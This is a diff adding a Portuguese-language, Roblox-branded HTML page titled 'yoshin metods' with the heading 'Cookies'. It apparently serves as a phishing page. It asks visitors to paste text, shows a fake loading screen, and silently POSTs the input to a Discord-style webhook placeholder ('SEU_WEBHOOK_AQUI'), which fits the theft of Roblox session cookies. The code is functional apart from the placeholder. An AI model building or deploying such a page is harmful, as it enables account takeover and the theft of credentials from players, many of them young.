@@ -1,0 +1,199 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>yoshin metods</title>
+
+    <style>
+        /* -------- FUNDO PRETO + LOGO ROBLOX -------- */
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: "Arial", sans-serif;
+            background: #000000;
+            color: white;
+            overflow-x: hidden;
+        }
+
+        .logo-bg {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            width: 600px;
+            height: 600px;
+            background: url('https://upload.wikimedia.org/wikipedia/commons/0/0a/Roblox_Logo_2022.svg') no-repeat center;
+            background-size: contain;
+            opacity: 0.06;
+            transform: translate(-50%, -50%);
+            pointer-events: none;
+            filter: drop-shadow(0 0 25px red);
+        }
+
+        /* -------- CONTAINER -------- */
+        .container {
+            position: relative;
+            width: 480px;
+            margin: 140px auto;
+            background: #0c0c0c;
+            padding: 35px;
+            border-radius: 20px;
+            text-align: center;
+            box-shadow: 0 0 35px #ff000055;
+            border: 2px solid #ff0000bb;
+            animation: fadeIn 1s ease forwards;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(25px); }
+            to   { opacity: 1; transform: translateY(0); }
+        }
+
+        /* -------- TEXTO 3D / NEON -------- */
+        h1 {
+            font-size: 38px;
+            margin-bottom: 10px;
+            color: #ff1c1c;
+            letter-spacing: 2px;
+            text-shadow:
+                0 0 10px red,
+                0 0 20px red,
+                0 0 40px #ff0000,
+                0 0 70px #ff0000,
+                2px 2px 0px #5c0000; /* efeito 3D */
+        }
+
+        /* -------- INPUT -------- */
+        input {
+            width: 90%;
+            padding: 14px;
+            margin-top: 25px;
+            border-radius: 10px;
+            border: 2px solid #ff0000bb;
+            background: #1a1a1a;
+            color: white;
+            font-size: 17px;
+            outline: none;
+            transition: 0.3s;
+        }
+
+        input:focus {
+            box-shadow: 0 0 18px red;
+            border-color: #ff2b2b;
+        }
+
+        /* -------- BOTÃO NEON -------- */
+        button {
+            margin-top: 30px;
+            padding: 15px 55px;
+            background: #ff0000;
+            border: none;
+            border-radius: 14px;
+            color: white;
+            font-size: 20px;
+            cursor: pointer;
+            transition: 0.3s;
+            box-shadow: 
+                0 0 20px #ff000099,
+                0 0 40px #ff000066;
+            animation: pulse 2.5s infinite linear;
+        }
+
+        @keyframes pulse {
+            0% { box-shadow: 0 0 15px #ff000099; }
+            50% { box-shadow: 0 0 35px #ff0000cc; }
+            100% { box-shadow: 0 0 15px #ff000099; }
+        }
+
+        button:hover {
+            background: #d10000;
+            transform: scale(1.06);
+        }
+
+        /* -------- TELA DE CARREGAMENTO -------- */
+        #loadingScreen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #000000f8;
+            display: none;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            color: white;
+            font-size: 28px;
+            animation: fadeInLoad 0.5s ease;
+        }
+
+        @keyframes fadeInLoad {
+            from { opacity: 0; }
+            to   { opacity: 1; }
+        }
+
+        .loader {
+            width: 380px;
+            height: 22px;
+            background: #1a1a1a;
+            border-radius: 14px;
+            margin-top: 20px;
+            overflow: hidden;
+            border: 2px solid red;
+        }
+
+        .loader-bar {
+            height: 100%;
+            width: 40%;
+            background: red;
+            animation: loading 1s infinite linear;
+        }
+
+        @keyframes loading {
+            0% { margin-left: -40%; }
+            100% { margin-left: 100%; }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- LOGO GRANDE DE FUNDO -->
+    <div class="logo-bg"></div>
+
+    <div class="container">
+        <h1>Cookies</h1>
+        <p>Digite qualquer texto:</p>
+
+        <input id="textoInput" type="text" placeholder="Escreva algo...">
+        <button onclick="enviarTexto()">Enviar</button>
+    </div>
+
+    <!-- TELA DE CARREGAMENTO -->
+    <div id="loadingScreen">
+        <div>Carregando...</div>
+        <div class="loader"><div class="loader-bar"></div></div>
+    </div>
+
+    <script>
+        function enviarTexto() {
+            const texto = document.getElementById("textoInput").value.trim();
+
+            if (texto === "") {
+                alert("Digite alguma coisa antes de enviar!");
+                return;
+            }
+
+            document.getElementById("loadingScreen").style.display = "flex";
+
+            fetch("SEU_WEBHOOK_AQUI", {
+                method: "POST",
+                headers: {"Content-Type": "application/json"},
+                body: JSON.stringify({
+                    content: "📩 **Nova mensagem enviada:**\n" + texto
+                })
+            });
+        }
+    </script>
+
+</body>
+</html>
